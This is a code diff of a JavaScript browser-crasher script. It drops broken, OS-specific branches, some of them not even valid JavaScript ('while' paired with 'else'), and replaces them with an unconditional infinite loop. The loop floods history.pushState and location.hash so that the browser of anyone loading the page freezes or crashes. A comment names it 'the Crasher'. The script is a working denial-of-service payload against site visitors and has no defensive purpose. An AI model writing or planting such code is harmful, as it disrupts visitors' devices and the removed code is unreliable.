@@ -20,32 +20,7 @@ if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigat
 }
 
 /* This Affects Most Computers Depending On Control */
-if (navigator.appVersion.indexOf("Win") != -1) {
-     while(1) {
-        for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();   
-        // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
-     } else {
-       break;
-     }
+while(1) {
+   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();   
+   // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
 } 
-if (navigator.appVersion.indexOf("Mac") != -1) {
-     while(1) {
-      
-     } else {
-       break;
-     }
-}
-if (navigator.appVersion.indexOf("X11") != -1) {
-     while(1) {
-      
-     } else {
-       break;
-     }
-}
-if (navigator.appVersion.indexOf("Linux") != -1) {
-     while(1) {
-      
-     } else {
-       break;
-     } 
-}
